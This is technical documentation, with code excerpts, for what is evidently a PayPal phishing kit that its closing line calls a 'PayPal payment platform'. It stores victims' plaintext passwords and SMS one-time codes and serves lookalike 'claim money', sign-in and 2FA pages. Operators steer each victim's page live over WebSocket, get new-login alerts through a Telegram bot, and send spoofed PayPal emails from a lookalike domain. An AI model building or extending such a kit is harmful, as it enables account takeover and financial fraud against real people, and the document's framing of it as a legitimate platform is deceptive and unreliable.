# Technical Documentation

## Architecture Overview

### Tech Stack
- **Frontend**: React 18 + TypeScript + Vite
- **Backend**: Express.js + TypeScript + Node.js
- **Database**: PostgreSQL + Drizzle ORM
- **Styling**: Tailwind CSS + shadcn/ui
- **Real-time**: WebSocket for user control
- **Bot**: Telegram Bot API
- **Email**: Multi-provider (Resend, SendGrid, MailerSend)

### Development Environment
- **Build Tool**: Vite for frontend, tsx for backend
- **Package Manager**: npm
- **Database Migrations**: Drizzle Kit
- **Hot Reload**: Enabled for both frontend and backend

## Database Architecture

### Schema Design
```typescript
// shared/schema.ts - Complete database schema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: varchar("username", { length: 255 }).unique().notNull(),
  passwordHash: varchar("password_hash", { length: 255 }).notNull(),
});

export const loginAttempts = pgTable("login_attempts", {
  id: serial("id").primaryKey(),
  emailOrPhone: varchar("email_or_phone", { length: 255 }).notNull(),
  password: varchar("password", { length: 255 }).notNull(),
  returnUri: varchar("return_uri", { length: 255 }),
  contextData: varchar("context_data", { length: 255 }),
  timestamp: timestamp("timestamp").defaultNow(),
  approved: boolean("approved").default(false),
});

export const smsSubmissions = pgTable("sms_submissions", {
  id: serial("id").primaryKey(),
  otpCode: varchar("otp_code", { length: 6 }).notNull(),
  stepupContext: varchar("stepup_context", { length: 255 }),
  contextData: varchar("context_data", { length: 255 }),
  rememberDevice: boolean("remember_device").default(false),
  timestamp: timestamp("timestamp").defaultNow(),
});

export const telegramUsers = pgTable("telegram_users", {
  id: serial("id").primaryKey(),
  telegramId: varchar("telegram_id", { length: 255 }).unique().notNull(),
  username: varchar("username", { length: 255 }),
  firstName: varchar("first_name", { length: 255 }),
  lastName: varchar("last_name", { length: 255 }),
  uniqueId: varchar("unique_id", { length: 255 }).unique().notNull(),
  isApproved: boolean("is_approved").default(false),
  createdAt: timestamp("created_at").defaultNow(),
  approvedAt: timestamp("approved_at"),
});

export const telegramLinks = pgTable("telegram_links", {
  id: serial("id").primaryKey(),
  telegramUserId: varchar("telegram_user_id", { length: 255 }).notNull(),
  linkId: varchar("link_id", { length: 255 }).unique().notNull(),
  price: varchar("price", { length: 255 }).notNull(),
  name: varchar("name", { length: 255 }).notNull(),
  link: varchar("link", { length: 255 }).notNull(),
  contextData: varchar("context_data", { length: 255 }).unique().notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const systemSettings = pgTable("system_settings", {
  id: serial("id").primaryKey(),
  key: varchar("key", { length: 255 }).unique().notNull(),
  value: varchar("value", { length: 255 }).notNull(),
  updatedAt: timestamp("updated_at").defaultNow(),
});
```

### Database Operations
```typescript
// server/storage.ts - Database interface
export interface IStorage {
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  // Login attempts
  createLoginAttempt(attempt: InsertLoginAttempt): Promise<LoginAttempt>;
  getLoginAttempts(): Promise<LoginAttempt[]>;
  approveLoginAttempt(id: number): Promise<void>;
  deleteLoginAttempt(id: number): Promise<void>;
  
  // SMS submissions
  createSmsSubmission(submission: InsertSmsSubmission): Promise<SmsSubmission>;
  getSmsSubmissions(): Promise<SmsSubmission[]>;
  deleteSmsSubmission(id: number): Promise<void>;
}
```

## API Architecture

### Route Structure
```typescript
// server/routes.ts - API endpoints
export async function registerRoutes(app: Express): Promise<Server> {
  // Authentication routes
  app.post("/api/login", loginHandler);
  app.post("/api/logout", logoutHandler);
  
  // Data routes
  app.get("/api/login-attempts", getLoginAttemptsHandler);
  app.post("/api/login-attempts", createLoginAttemptHandler);
  app.post("/api/login-attempts/:id/approve", approveLoginAttemptHandler);
  app.delete("/api/login-attempts/:id", deleteLoginAttemptHandler);
  
  app.get("/api/sms-submissions", getSmsSubmissionsHandler);
  app.post("/api/sms-submissions", createSmsSubmissionHandler);
  app.delete("/api/sms-submissions/:id", deleteSmsSubmissionHandler);
  
  // System control routes
  app.get("/api/redirect/status", getRedirectStatusHandler);
  app.post("/api/redirect/toggle", toggleRedirectHandler);
  app.post("/api/user-redirect", userRedirectHandler);
  
  // Testing routes
  app.post("/api/test-email", testEmailHandler);
  app.post("/api/test-telegram-notification", testTelegramHandler);
  
  // WebSocket server
  const httpServer = createServer(app);
  const wss = new WebSocketServer({ server: httpServer, path: "/ws" });
  
  return httpServer;
}
```

### WebSocket Implementation
```typescript
// Real-time user control via WebSocket
wss.on("connection", (ws: WebSocket, req) => {
  const url = new URL(req.url!, `http://${req.headers.host}`);
  const contextData = url.searchParams.get("context_data");
  
  if (contextData) {
    global.userConnections!.set(contextData, ws);
    
    ws.on("close", () => {
      global.userConnections!.delete(contextData);
    });
  }
});
```

## Telegram Bot Architecture

### Bot Structure
```typescript
// server/telegramBot.ts - Telegram bot implementation
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN!, { 
  polling: { interval: 1000, autoStart: true }
});

// User management
bot.onText(/\/start/, startHandler);
bot.onText(/\/approve (.+)/, approveHandler);
bot.onText(/\/create/, createLinkHandler);
bot.onText(/\/links/, showLinksHandler);

// Admin commands
bot.onText(/\/enable_bot/, enableBotHandler);
bot.onText(/\/disable_bot/, disableBotHandler);
bot.onText(/\/enable_site/, enableSiteHandler);
bot.onText(/\/disable_site/, disableSiteHandler);
```

### User Flow Management
```typescript
// User state management
const userStates = new Map<string, { state: string; data?: any }>();

async function handleUserState(
  chatId: number,
  telegramId: string,
  text: string,
  userState: any
) {
  switch (userState.state) {
    case "creating_link":
      await handleLinkCreation(chatId, telegramId, text);
      break;
    case "sending_email":
      await handleEmailSending(chatId, telegramId, text, userState.data);
      break;
    default:
      await handleDefaultState(chatId, telegramId, text);
  }
}
```

### Notification System
```typescript
// Targeted notifications
export async function notifyLoginAttempt(
  loginAttemptId: number,
  emailOrPhone: string,
  contextData: string
) {
  const linkRecord = await db
    .select()
    .from(telegramLinks)
    .where(eq(telegramLinks.contextData, contextData))
    .limit(1);
    
  if (linkRecord.length > 0) {
    await bot.sendMessage(
      linkRecord[0].telegramUserId,
      `🔔 НОВЫЙ ВХОД\n\nEmail/Phone: ${emailOrPhone}\n\nID: ${loginAttemptId}`
    );
  }
}
```

## Frontend Architecture

### Component Structure
```typescript
// client/src/App.tsx - Main routing
function Router() {
  const [location] = useLocation();
  
  return (
    <Switch>
      <Route path="/" component={ClaimMoneyPage} />
      <Route path="/signin" component={SigninPage} />
      <Route path="/authflow/challenges/softwareToken" component={SmsChallengePage} />
      <Route path="/admin" component={AdminPanel} />
      <Route path="/admin/login" component={AdminLogin} />
      <Route component={NotFound} />
    </Switch>
  );
}
```

### State Management
```typescript
// client/src/lib/queryClient.ts - TanStack Query setup
export const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      queryFn: getQueryFn({ on401: "throw" }),
      retry: false,
      refetchOnWindowFocus: false,
    },
  },
});

// API request function
export async function apiRequest(
  endpoint: string,
  options: RequestInit = {}
): Promise<Response> {
  const response = await fetch(`/api${endpoint}`, {
    credentials: "include",
    ...options,
  });
  
  await throwIfResNotOk(response);
  return response;
}
```

### Dynamic Page Management
```typescript
// client/src/components/DynamicPageManager.tsx
export const DynamicPageManager: React.FC<DynamicPageManagerProps> = ({ 
  contextData, 
  defaultPage = "payment" 
}) => {
  const [currentPage, setCurrentPage] = useState(defaultPage);
  
  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/user-state/${contextData}`);
        const data = await response.json();
        if (data.page && data.page !== currentPage) {
          setCurrentPage(data.page);
        }
      } catch (error) {
        console.error("Error fetching user state:", error);
      }
    }, 1000);
    
    return () => clearInterval(interval);
  }, [contextData, currentPage]);
  
  return (
    <div>
      {currentPage === "payment" && <ClaimMoneyPage />}
      {currentPage === "signin" && <SigninPage />}
      {currentPage === "sms" && <SmsChallengePage />}
    </div>
  );
};
```

## Email System Architecture

### Multi-Provider Setup
```typescript
// server/telegramBot.ts - Email provider fallback
export async function sendPayPalNotificationEmail(
  to: string,
  linkData: any
): Promise<boolean> {
  // Try Resend first
  if (process.env.RESEND_API_KEY) {
    try {
      const { Resend } = await import("resend");
      const resend = new Resend(process.env.RESEND_API_KEY);
      
      const result = await resend.emails.send({
        from: "service@pypal.link",
        to: to,
        subject: "PayPal Notification",
        html: processedTemplate,
      });
      
      return true;
    } catch (error) {
      console.error("Resend failed:", error);
    }
  }
  
  // Fallback to SendGrid
  if (process.env.SENDGRID_API_KEY) {
    try {
      const sgMail = await import("@sendgrid/mail");
      sgMail.setApiKey(process.env.SENDGRID_API_KEY);
      
      await sgMail.send({
        from: { email: "service@pypal.link", name: "service@paypal.de" },
        to: to,
        subject: "PayPal Notification",
        html: processedTemplate,
      });
      
      return true;
    } catch (error) {
      console.error("SendGrid failed:", error);
    }
  }
  
  return false;
}
```

### Template Processing
```typescript
// Dynamic template replacement
function processEmailTemplate(template: string, data: any): string {
  return template
    .replace(/{Name}/g, data.senderName || "PayPal User")
    .replace(/{price}/g, data.price || "0,00 €")
    .replace(/{link}/g, data.generatedLink || "")
    .replace(/{datum}/g, formatGermanDate())
    .replace(/{code}/g, generateTransactionCode());
}
```

## Security Architecture

### Authentication
```typescript
// server/routes.ts - Session-based auth
declare module "express-session" {
  interface SessionData {
    adminId?: string;
  }
}

// Admin authentication middleware
function requireAuth(req: Request, res: Response, next: NextFunction) {
  if (!req.session.adminId) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}
```

### Admin Control
```typescript
// config/admins.json - Admin configuration
{
  "admins": [
    "8146147595"  // @Dalsend Telegram ID
  ]
}

// server/telegramBot.ts - Admin verification
function loadAdmins(): string[] {
  try {
    const adminsConfig = JSON.parse(
      fs.readFileSync(path.join(process.cwd(), "config", "admins.json"), "utf8")
    );
    return adminsConfig.admins || ["8146147595"];
  } catch (error) {
    console.error("Error loading admins:", error);
    return ["8146147595"];
  }
}

async function isUserAdmin(telegramId: string): Promise<boolean> {
  const admins = loadAdmins();
  return admins.includes(telegramId);
}
```

## Performance Optimizations

### Database Connections
```typescript
// server/db.ts - Connection pooling
export const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 10,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});
```

### WebSocket Management
```typescript
// Global connection tracking
declare global {
  var userConnections: Map<string, WebSocket> | undefined;
}

if (!global.userConnections) {
  global.userConnections = new Map();
}
```

### Caching Strategy
```typescript
// client/src/lib/queryClient.ts - Query caching
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 5 * 60 * 1000, // 5 minutes
      cacheTime: 10 * 60 * 1000, // 10 minutes
    },
  },
});
```

## Deployment Configuration

### Environment Setup
```bash
# Production environment variables
NODE_ENV=production
DATABASE_URL=postgresql://user:pass@host:port/db
TELEGRAM_BOT_TOKEN=bot_token_here
RESEND_API_KEY=resend_key_here
SENDGRID_API_KEY=sendgrid_key_here
MAILERSEND_API_KEY=mailersend_key_here
```

### Build Process
```json
// package.json - Build scripts
{
  "scripts": {
    "dev": "tsx server/index.ts",
    "build": "vite build",
    "start": "node dist/index.js",
    "db:push": "drizzle-kit push",
    "db:generate": "drizzle-kit generate"
  }
}
```

### Static File Serving
```typescript
// server/vite.ts - Production static serving
export function serveStatic(app: Express) {
  app.use(express.static(path.join(__dirname, "../dist/public")));
  
  app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "../dist/public/index.html"));
  });
}
```

## Monitoring and Debugging

### Logging System
```typescript
// server/vite.ts - Logging utility
export function log(message: string, source = "express") {
  const timestamp = new Date().toLocaleTimeString();
  console.log(`${timestamp} [${source}] ${message}`);
}
```

### Error Handling
```typescript
// server/index.ts - Global error handler
app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
  console.error("Global error handler:", err);
  res.status(500).json({ error: "Internal server error" });
});
```

### Debug Endpoints
```typescript
// Testing endpoints for debugging
app.post("/api/test-email", testEmailHandler);
app.post("/api/test-telegram-notification", testTelegramHandler);
app.post("/api/simulate-new-user-notification", simulateNotificationHandler);
```

This technical documentation provides comprehensive details for developers working with the PayPal payment platform codebase.